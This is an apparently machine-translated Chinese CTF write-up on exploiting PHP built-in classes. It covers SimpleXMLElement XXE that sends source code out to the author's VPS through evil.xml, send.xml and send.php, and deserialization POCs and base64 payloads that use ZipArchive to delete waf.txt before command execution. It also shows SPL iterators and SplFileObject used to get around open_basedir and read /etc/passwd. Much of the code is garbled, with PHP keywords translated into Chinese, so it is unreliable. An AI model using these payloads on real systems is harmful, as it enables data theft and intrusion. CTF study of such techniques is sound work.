`SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。`

## `SimpleXMLElement 类`

`官方文档中对于 SimpleXMLElement 类的构造方法`SimpleXMLElement::__construct`的定义如下：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084254.png)`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084255.png)`

`可以看到通过设置第三个参数 data_is_url
为`true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`营养。第一个参数数据就是我们自己设置的有效载荷的url地址，即用于引入的外部用户的url。`

`这样的话，当我们可以控制目标调用的类的时候，便可以通过SimpleXMLElement这个内置类来构造XXE。`

## `[SUCTF 2018]作业`

`进入题目，随便注册一个账号，登录作业平台。有一个`calc`计算器类的代码。有两个按钮，一个用于调用`calc`类实现实现数字的四则操作。用于上传文件，提交代码。`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084257.png)`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084258.png)`

``calc` 计算器类的代码为：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35  
    

|

    
    
       
    class  calc { function __construct__ (  
         ) {  
            计算 ();   
        }  
      
        函数 calc ( $args1 , $method , $args2 ) { $args1 =intval( $args1 ); $args2 =intval( $args2 ); switch ( $method ) { case 'a' : $method = "+" ; 打破;  
              
              
              
                   
                      
                      
      
                case  'b' : $method = "-" ; 打破;  
                      
                      
      
                case  'c' : $method = "*" ; 打破;  
                      
                      
      
                case  'd' : $method = "/" ; 打破; 默认值：die（“无效输入”）；        } $表达式= $ args1。$方法。$args2 ; eval ( "\$r= $Expression ;" ); die ( "计算结果：" . $r );     } } ?>  
                      
                      
                              
                  
                      
      
              
              
              
      
      
            
      
  
---|---  
  
`  
`

`我们点击计算按钮，计算2+2=4，我们观察url处的参数，再结合`calc`计算器类的代码参数模块，args的参数为调用的类的构造方法：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084259.png)`

`所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用SimpleXMLElement这个内置类来构造XXE。`

`首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。`

`邪恶.xml：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
    xml version= "1.0" ?>  
       
    "http://47.xxx.xxx.72/send.xml" >   
    %remote;   
    %全部;   
    %发送;   
    ]>  
      
  
---|---  
  
`  
`

`发送.xml：`

`  
`

``

`PHP`

``

    
    
    1   
    2  
    

|

    
    
    "php://filter/read=convert.base64-encode/resource=index.php" >   
    "" >  
      
  
---|---  
  
`  
`

`发送.php：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
       
     file_put_contents( "result.txt" , $_GET [ 'file' ]) ;   
    ?>  
      
  
---|---  
  
`  
`

`然后在url中构造如下：`

`  
`

``

`代码`

``

    
    
    1  
    

|

    
    
    /show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true  
      
  
---|---  
  
`  
`

`这样目标主机先加载我们vps上的evil.xml，再send.xml加载。`

`如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084301.png)`

`解题过程不用写了。`

# `使用 ZipArchive 类来删除文件`

## `ZipArchive 类`

`PHP ZipArchive 类是 PHP 的一个原生类，它是在 PHP 5.20 之后的日期。ZipArchive 类可以对文件进行压缩与解压缩处理。`

`下面几个常见的类方法：`

  * ``ZipArchive::addEmptyDir`：添加一个新的文件目录`

  * ``ZipArchive::addFile`：将文件添加到指定zip压缩包中`

  * ``ZipArchive::addFromString`：添加新的文件同时将内容添加进去`

  * ``ZipArchive::close`：关闭压缩包`

  * ``ZipArchive::extractTo`：将压缩包解压`

  * ``ZipArchive::open`：打开一个zip压缩包`

  * ``ZipArchive::deleteIndex`：删除压缩包中的某个文件，如：deleteIndex(0)代表删除第一个文件`

  * ``ZipArchive::deleteName`：删除压缩包中的某个文件名称，同时也将文件删除`

  * `……`

`我们来重点看看`ZipArchive::open`方法：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    ZipArchive::open( string  $filename , int  $flags = 0 )  
      
  
---|---  
  
`  
`

`该方法可以打开一个新的或已有的压缩文件以进行读取，写入或修改。`

  * `文件名：要打开的 ZIP 存档的文件名。`

  * `flags：用于打开档案的模式。有以下几种模式：`

    * ``ZipArchive::OVERWRITE`：总是以一个新的压缩包开始，这种模式下如果已经存在形式被覆盖或删除。`

    * ``ZipArchive::CREATE`：如果不存在则创建一个zip压缩包。`

    * ``ZipArchive::RDONLY`：只读模式打开压缩包。`

    * ``ZipArchive::EXCL`：如果压缩包已经存在，则出错。`

    * ``ZipArchive::CHECKCONS`：对压缩包执行异常显示的错误检查，如果失败则错误。`

`注意，如果设置了参数的情况`ZipArchive::OVERWRITE`，可以指定文件删除。这里我们跟进方法const OVERWRITE =
8，就是将OVERWRITE定义为常量8，我们在调用时也可以直接将flags赋值为也可以8。`

`我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。`

## `梦里花开牡丹亭`

`进入题目，提交源码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35   
    36   
    37   
    38   
    39   
    40   
    41   
    42   
    43   
    44   
    45   
    46   
    47   
    48   
    49   
    50   
    51   
    52   
    53   
    54   
    55   
    56   
    57  
    58   
    59   
    60   
    61   
    62   
    63   
    64   
    65   
    66   
    67   
    68   
    69   
    70   
    71   
    72   
    73  
    

|

    
    
      
     highlight_file( __FILE__ );   
    错误报告（0）；  
    包括（'shell.php'）;   
    类 游戏{公共$用户名; 公共$password ; 公共$choice ; 公共$register ;  
            
            
            
            
      
        公共  $file ; 公共$ 文件名；公开$content ; 公共函数__construct (  
            
            
          
          )  
         { $this ->username= 'user' ; $this ->password= '用户' ;     }  
              
              
      
      
        公共 函数 __wakeup () { if (md5( $this ->register)=== "21232f297a57a5a743894a0e4a801fc3" ){     // admin $this ->choice= new login( $this ->file, $this ->filename, $this ->content) ;         } else { $this ->choice = new register();         }     }公共函数__destruct (  
              
                  
      
                  
      
      
          ) { $this ->choice->checking( $this ->username, $this ->password);     }  
              
      
      
    }  
    类 登录{公共$file ; 公共$ 文件名；公开$content ;  
           
           
           
      
        公共 函数 __construct ( $file , $filename , $content )  
         { $this ->file= $file ; $this ->filename= $filename ; $this ->content= $content ;     }公共函数检查( $username , $password ) { if ( $username === 'admin' && $password === 'admin' ){ $this ->file->open( $this ->filename,  
              
              
              
      
            
          
              
                $this -> 内容); die ( '登录成功就可以打开shell文件了！' );         }     } } class register {公共功能检查（$username , $password） { if ( $username === 'admin' && $password === 'admin' ){ die ( 'success register admin' );         } else {死（'请注册管理员'）;         }     } }  
                  
      
      
      
       
            
          
              
                  
      
                  
      
      
      
    class  Open { function open ( $filename , $content ) { if (!file_get_contents( 'waf.txt' )){     //当waf.txt没读取成功时才能得到flag             shell( $content );         } else { echo file_get_contents( $filename . ".php" );    // filename=php://filter/read=convert.base64-encode/resource=shell         }    }} if ( $_GET [ 'a' ]!== $_GET [ 'b' ]&&(md5(  
           
              
      
      
                  
      
      
      
    $_GET [ 'a' ]) === md5( $_GET [ 'b' ])) && (sha1( $_GET [ 'a' ])=== sha1( $_GET [ 'b' ]))){   
        @unserialize(base64_decode( $_POST [ 'unser' ]));   
    }  
      
  
---|---  
  
`  
`

`开头包含了shell.php，我们可以构造反序列化POC来读取shell.php：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35   
    36   
    37   
    38   
    39   
    40   
    41   
    42   
    43   
    44   
    45   
    46   
    47   
    48  
    

|

    
    
      
    class  Game { public $username ; 公共$password ; 公共$choice ; 公共$register ;  
            
            
            
            
      
        公共  $file ; 公共$ 文件名；公开$content ; 公共函数__construct (  
            
            
          
          )  
         { $this ->username= 'user' ; $this ->password= '用户' ;     }  
              
              
      
      
        公共 函数 __wakeup () { if (md5( $this ->register)=== "21232f297a57a5a743894a0e4a801fc3" ){     // admin $this ->choice= new login( $this ->file, $this ->filename, $this ->content) ;         } else { $this ->choice = new register();         }     }公共函数__destruct (  
              
                  
      
                  
      
      
          ) { $this ->choice->checking( $this ->username, $this ->password);     }  
              
      
      
    }  
      
    类 登录{公共$file ; 公共$ 文件名；   公开$content ; }  
           
           
           
      
      
    class  Open { function open ( $filename , $content ) {    }} $poc = new Game(); $poc ->username = "admin" ; $poc ->password = "admin" ; $poc ->register = "admin" ; $poc ->file = new Open(); $poc ->filename = "php://filter/read=convert.base64-encode/resource=shell" ; $poc ->content = "xxx" ;  
           
      
      
      
      
      
      
      
      
      
    $poc ));  
      
  
---|---  
  
`  
`

`执行POC得到payload：`

`  
`

``

`蟒蛇`

``

    
    
    1  
    

|

    
    
    Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjQ6ImxzIC8iO30 =  
      
  
---|---  
  
`  
`

`执行payload读取到shell.php的源码base64编码：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084302.png)`

`解码得到shell.php的源码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12  
    

|

    
    
      
    function  shell ( $cmd ) { if (strlen( $cmd )< 10 ){ if (preg_match( '/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk |cut|grep|uniq|string|sed|rev|zip|\*|\?/' , $cmd )){ die ( "NO" );         } else {返回系统( $cmd );         }     } else {死（'这么久！'）;     } }  
          
              
                  
      
                  
      
      
              
      
      
      
  
---|---  
  
`  
`

`联合index.php里面的Open类：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9  
    

|

    
    
    class  Open { function open ( $filename , $content ) { if (!file_get_contents( 'waf.txt' )){     //当waf.txt没读取成功时才能得到flag             shell( $content );         } else { echo file_get_contents( $filename . ".php" );    // 文件名=php://filter/read=convert.base64-encode/resource=shell         }    }}  
           
              
      
      
                  
      
      
      
      
  
---|---  
  
`  
`

`假如我们只要使`file_get_contents('waf.txt')`读取失败就可以进入`shell($content)`执行系统命令。所以我们应该可以办法将waf.txt文件删除，这样就可以读取失败，才能执行我们的命令失败。`

`要删除waf.txt只能认为自己原生类了，并且可以在这个类中找到一个open()方法。`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16  
    

|

    
    
      
    $classes = get_declared_classes();   
    foreach ( $classes  as  $class ) { $methods = get_class_methods( $class ); foreach ( $methods as $method ) { if (in_array( $method , array ( '__destruct' , '__wakeup' , '__call' , '__callStatic' , 'open'         ))) { print $class . '::'。$方法。"\n" ;  
          
            
              
                  
                  
                  
                  
                  
      
                   
      
        }   
    }  
      
  
---|---  
  
`  
`

`找到了一个ZipArchive类，其中刚好有一个open()方法刚好符合：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    ZipArchive::open( $filename , $flags = null )  
      
  
---|---  
  
`  
`

`如果设置了flags参数的`ZipArchive::OVERWRITE`话，可以指定文件删除。这里我们跟进的方法可以看到const OVERWRITE =
8，也就是将OVERWRITE定义为常量8，我们在调用时也可以直接将flags授权为8。`

`所以我们利用ZipArchive原生类调用打开方法，分类将$filename（waf.txt）删除：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    ZipArchive::open( $filename , ZipArchive::OVERWRITE)  
      
  
---|---  
  
`  
`

`删除waf.txt的POC：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35   
    36   
    37   
    38   
    39   
    40   
    41   
    42   
    43   
    44   
    45   
    46   
    47   
    48  
    

|

    
    
      
    class  Game { public $username ; 公共$password ; 公共$choice ; 公共$register ;  
            
            
            
            
      
        公共  $file ; 公共$ 文件名；公开$content ; 公共函数__construct (  
            
            
          
          )  
         { $this ->username= 'user' ; $this ->password= '用户' ;     }  
              
              
      
      
        公共 函数 __wakeup () { if (md5( $this ->register)=== "21232f297a57a5a743894a0e4a801fc3" ){     // admin $this ->choice= new login( $this ->file, $this ->filename, $this ->content) ;         } else { $this ->choice = new register();         }     }公共函数__destruct (  
              
                  
      
                  
      
      
          ) { $this ->choice->checking( $this ->username, $this ->password);     }  
              
      
      
    }  
      
    类 登录{公共$file ; 公共$ 文件名；   公开$content ; }  
           
           
           
      
      
    class  Open { function open ( $filename , $content ) {    }} $poc = new Game(); $poc ->username = "admin" ; $poc ->password = "admin" ; $poc ->register = "admin" ; $poc ->file = new ZipArchive(); $poc ->filename = "waf.txt" ; $poc ->content = ZipArchive::OVERWRITE; echo base64_encode(serialize( $poc ));  
           
      
      
      
      
      
      
      
      
      
      
      
  
---|---  
  
`  
`

`生成有效载荷：`

`  
`

``

`蟒蛇`

``

    
    
    1  
    

|

    
    
    Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo4O30 =  
      
  
---|---  
  
`  
`

`执行后，删除waf.txt。标志就可以使用`n\l /fla*`执行命令读取了：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35   
    36   
    37   
    38   
    39   
    40   
    41   
    42   
    43   
    44   
    45   
    46   
    47   
    48  
    

|

    
    
      
    class  Game { public $username ; 公共$password ; 公共$choice ; 公共$register ;  
            
            
            
            
      
        公共  $file ; 公共$ 文件名；公开$content ; 公共函数__construct (  
            
            
          
          )  
         { $this ->username= 'user' ; $this ->password= '用户' ;     }  
              
              
      
      
        公共 函数 __wakeup () { if (md5( $this ->register)=== "21232f297a57a5a743894a0e4a801fc3" ){     // admin $this ->choice= new login( $this ->file, $this ->filename, $this ->content) ;         } else { $this ->choice = new register();         }     }公共函数__destruct (  
              
                  
      
                  
      
      
          ) { $this ->choice->checking( $this ->username, $this ->password);     }  
              
      
      
    }  
      
    类 登录{公共$file ; 公共$ 文件名；   公开$content ; }  
           
           
           
      
      
    class  Open { function open ( $filename , $content ) {    }} $poc = new Game(); $poc ->username = "admin" ; $poc ->password = "admin" ; $poc ->register = "admin" ; $poc ->file = new Open(); $poc ->filename = "xxx" ; $poc ->content = "n\l /flag" ; echo base64_encode(serialize( $poc ));  
           
      
      
      
      
      
      
      
      
      
      
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084304.png)`

# `PHP原生文件操作类`

## `声压级`

`SPL就是标准PHP库的缩写。据手册显示，SPL是用于解决典型问题（标准问题）的一组接口与类的集合：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084305.png)`

`SPL 对 PHP 引擎进行了扩展，例如 ArrayAccess、able 和 SeekableIterator
等接口，它们的形式可以操作对象同时，你还可以使用 RecursiveIterator、ArrayObejcts
等其他迭代器进行数据的测试操作。的对象例如Exceptions、SplObserver、Spltorage以及splautoloadregister、splclasses、iteratorapply等的帮助函数（helper
functions），用于重载的功能。从质上提升 PHP 的代码效率。`

`因为SPL是要解决典型问题，免不了有一些处理文件的类。`

## `可遍历目录类`

`可遍历目录类有以下几个：`

  * `DirectoryIterator 类`

  * `FilesystemIterator 类`

  * `GlobIterator 类`

### `DirectoryIterator 类`

`DirectoryIterator 类提供了一个用于系统目录内容的简单接口。该类的构造方法将创建一个指定目录的查看文件。`

`类摘要：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32  
    

|

    
    
    DirectoryIterator  extends  SplFileInfo  implements  SeekableIterator { /* 方法 */ public __construct ( string $path ) public current() : DirectoryIterator public getATime() : int public getBasename ( string $suffix = ? ) : string public getCTime ( ) : int public getExtension ( ) : string public getFilename() : string public getGroup() : int public getInode() :  
    	  
    	   
    	  
    	  
    	   
    	  
    	  
    	  
    	  
    	int public getMTime()：int public getOwner()：int public getPath()：string public getPathname()：string public getPerms()：int public getSize()：int public getType()：string public isDir()：bool public isDot(): bool public isExecutable() : bool public isFile() : bool public isLink() : bool public isReadable() : bool  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	  
    	public isWritable( ) : bool public key ( ) : string public next ( ) : void public rewind ( ) : void public seek ( int $position ) : void public __toString ( ) : string //以字符串形式获取文件名public valid ( ) :布尔}  
    	  
    	  
    	  
    	   
    	      
    	  
      
      
  
---|---  
  
`  
`

`利用 DirectoryIterator 类遍历指定目录里的文件：`

`如果我们这样：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $dir = new  DirectoryIterator ( "/" );   
    回声 $dir ;  
      
  
---|---  
  
`  
`

`会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的`__toString()`方法，输出指定目录进入排序之后的第一个文件名：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084306.png)`

`也可以配合glob://协议使用模式匹配来寻找我们想要的文件路径：`

> `glob://协议解析匹配的文件路径模式`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $dir = new  DirectoryIterator ( "glob:///*flag*" );   
    回声 $dir ;  
      
  
---|---  
  
`  
`

`![]()`

`如果想输出全部的文件名我们还需要对$dir对象进行遍历：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6  
    

|

    
    
      
    $dir = new  DirectoryIterator ( "/" );   
    foreach ( $dir  as  $f ){ echo ( $f . '  
    ' ); //echo($f->__toString().'  
    '); }  
          
          
      
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084307.png)`

### `FilesystemIterator 类`

`FilesystemIterator 类与 DirectoryIterator
类相同，提供了一个文件系统目录内容的简单接口。该类的构造方法将创建一个指定目录用于查看的更新器。`

`该类的使用方法与DirectoryIterator类同样基本相同的：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $dir = new  FilesystemIterator ( "/" );   
    回声 $dir ;  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084308.png)`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $dir = new  FilesystemIterator ( "glob:///*flag*" );   
    回声 $dir ;  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084309.png)`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6  
    

|

    
    
      
    $dir = new  FilesystemIterator ( "/" );   
    foreach ( $dir  as  $f ){ echo ( $f . '  
    ' ); //echo($f->__toString().'  
    '); }  
          
          
      
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084310.png)`

### `GlobIterator 类`

`与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也相似。文件路径。`

`类摘要：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13  
    

|

    
    
    GlobIterator 扩展 FilesystemIterator 工具 SeekableIterator，可数{ / * *方法/公共__construct（字符串$模式，INT $国旗= FilesystemIterator :: KEY_AS_PATHNAME | FilesystemIterator :: CURRENT_AS_FILEINFO）公共计数（）：INT / *继承的方法* /公共FilesystemIterator： :__construct ( string $path , int $flags = FilesystemIterator ::KEY_AS_PATHNAME | FilesystemIterator  
    	  
    	    
    	  
    	  
    	   ::CURRENT_AS_FILEINFO | FilesystemIterator ::SKIP_DOTS ) public FilesystemIterator ::current ( ) : 混合public FilesystemIterator ::getFlags ( ) : int public FilesystemIterator ::key ( ) : string public FilesystemIterator ::next ( ) : void public FilesystemIterator ::rewind ( ) : void public FilesystemIterator ::setFlags ( int $flags = ? ) : void }  
    	   
    	   
    	   
    	   
    	   
    	    
      
      
  
---|---  
  
`  
`

`我们知道，向下面这样在容易的使用DirectoryIterator类和FilesystemIterator类并且没有配合glob://进行匹配的时候：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7  
    

|

    
    
      
    $dir = new  DirectoryIterator ( "/" );   
    回声 $dir ;  
      
      
    $dir = new  FilesystemIterator ( "/" );   
    回声 $dir ;  
      
  
---|---  
  
`  
`

`其构造函数创建不是一个指定的函数选择器，当我们使用函数输出的时候会触发这两个类中的函数`__toString()`，输出指定目录里面特定的第一个文件名。我们不循环遍历是看不到指定里目录的，而GlobIterator类可以帮我们在一定的范围内解决这个问题。我们知道一个文件名的秘密，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但我们不知道flag文件的完整文件名，我们可以通过类似`GlobIterator(/*flag*)`：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $dir = new  GlobIterator ( "/*flag*" );   
    回声 $dir ;  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084311.png)`

### `使用可遍历目录类 open_basedir`

  * `使用 DirectoryIterator 类`

`DirectoryIt与glob://协议结合将视open_basedir对目录的限制，可以免除指定目录下的文件。`

`测试代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10  
    

|

    
    
      
    $dir = $_GET [ 'whoami' ];   
    $a = new  DirectoryIterator ( $dir );   
    foreach ( $a  as  $f ){ echo ( $f ->__toString(). '  
    ' ); // 不加__toString()也可,因为echo可以自动调用} ?>  
          
      
      
      
    #payload 一句的形式：  
    $a = new  DirectoryIterator ( "glob:///*" ); foreach ( $a  as  $f ){ echo ( $f ->__toString(). '  
    ' );}  
      
  
---|---  
  
`  
`

`我们输入`/?whoami=glob:///*`第一步目录下的所有文件：`

`![]()`

`网站目录下的所有文件：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084312.png)`

  * `使用 FilesystemIterator 类`

`测试代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10  
    

|

    
    
      
    $dir = $_GET [ 'whoami' ];   
    $a = new  FilesystemIterator ( $dir );   
    foreach ( $a  as  $f ){ echo ( $f ->__toString(). '  
    ' ); // 不加__toString()也可,因为echo可以自动调用} ?>  
          
      
      
      
    #payload 一句的形式：  
    $a = new  FilesystemIterator ( "glob:///*" ); foreach ( $a  as  $f ){ echo ( $f ->__toString(). '  
    ' );}  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084313.png)`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084314.png)`

  * `使用 GlobIterator 类`

`由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用配合glob://协议了。`

`测试代码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10  
    

|

    
    
      
    $dir = $_GET [ 'whoami' ];   
    $a = new  GlobIterator ( $dir );   
    foreach ( $a  as  $f ){ echo ( $f ->__toString(). '  
    ' ); // 不加__toString()也可,因为echo可以自动调用} ?>  
          
      
      
      
    #payload 一句的形式：  
    $a = new  FilesystemIterator ( "/*" ); foreach ( $a  as  $f ){ echo ( $f ->__toString(). '  
    ' );}  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084315.png)`

## `可读取文件类`

`现在发现的可读取文件类有：`

  * `SplFileObject 类`

### `SplFileObject 类`

`SplFileInfo 类为单个文件的信息提供了一个高级的模型对象的接口，用于对文件内容的遍历、查找、操作等。详情请参考：https
://www.php.net/manual/zh/class .splfileobject.php`

`该类的构造方法可以构造一个新的文件对象用于拍摄的。`

`我们可以像下面这样去读取一个文件的一行：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3  
    

|

    
    
      
    $context = new  SplFileObject ( '/etc/passwd' );   
    回声 $context ;  
      
  
---|---  
  
`  
`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084316.png)`

`但是这样也还可以读取一行，要全部读取完的话需要对文件中的每一行内容进行遍历：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5  
    

|

    
    
      
    $context = new  SplFileObject ( '/etc/passwd' );   
    foreach ( $context  as  $f ){ echo ( $f ); }  
          
      
      
  
---|---  
  
`  
`

`![]()`

## `[2021 MAR DASCTF 明御攻防赛]ez_serialize`

`进入题目，提交源码：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10   
    11   
    12   
    13   
    14   
    15   
    16   
    17   
    18   
    19   
    20   
    21   
    22   
    23   
    24   
    25   
    26   
    27   
    28   
    29   
    30   
    31   
    32   
    33   
    34   
    35   
    36   
    37   
    38   
    39   
    40   
    41   
    42   
    43   
    44   
    45   
    46   
    47   
    48   
    49   
    50   
    51   
    52   
    53  
    

|

    
    
      
     error_reporting( 0 );   
    高亮文件（__FILE__）；  
      
    类 A {公共$class ; 公共$para ; 公共$check ; 公共函数__construct (  
           
           
           
          )  
         { $this ->class = "B" ; $this ->para = "ctfer" ; echo new $this ->class ( $this ->para);     }公共函数__wakeup (  
              
              
                 
      
          ) // 可以直接绕过__wakeup ()方法的执行  
        { $this ->check = new C; if ( $this ->check->vaild( $this ->para) && $this ->check->vaild( $this ->class)) { echo new $this ->class ( $this ->para);         } else die ( '坏黑客~' );     }  
              
              
                     
      
              
                  
      
      
    } B  
    类 { var $a ; 公共函数__construct ( $a ) { $this ->a = $a ; echo ( "你好" . $this ->a);     } } C类{  
           
            
          
              
              
      
      
       
      
        function  vaild ( $code ) { $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i' ; if (preg_match( $pattern , $code )){ return false ;        } else return true ;    }}  
              
              
                   
      
              
                   
      
      
      
      
    if ( isset ( $_GET [ 'pop' ])){ 反  
        序列化( $_GET [ 'pop' ]);   
    }   
    else { $a =新A;  
          
      
    }  
      
  
---|---  
  
`  
`

`在A、B、C三个类都没有什么危险函数，应该是没有利用的点，估计应该是原生类的利用。我们可以利用上面说的那几个文件处理的原生去读文件。`

`首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10  
    

|

    
    
      
    class  A { public $class = 'FilesystemIterator' ;    // FilesystemIterator("/var/www/html") public $para = "/var/www/html/" ; 公共$check ;     }  
           
          
           
           
      
      
    $poc   = new A();   
    回声序列化（$poc）；  
      
  
---|---  
  
`  
`

`得到有效载荷：`

`  
`

``

`PHP`

``

    
    
    1  
    

|

    
    
    O: 1 : "A" : 3 :{s: 5 : "class" ;s: 18 : "FilesystemIterator" ;s: 4 : "para" ;s: 14 : "/var/www/html/" ;s ：5：“检查” ;N;}  
      
  
---|---  
  
`  
`

`执行后得到一个文件夹aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084317.png)`

`并在这个文件夹中找到了flag.php：`

`![](https://gitee.com/fuli009/images/raw/master/public/20210826084319.png)`

`然后我们使用 SplFileObject 类读取flag.php就行了：`

`  
`

``

`PHP`

``

    
    
    1   
    2   
    3   
    4   
    5   
    6   
    7   
    8   
    9   
    10  
    

|

    
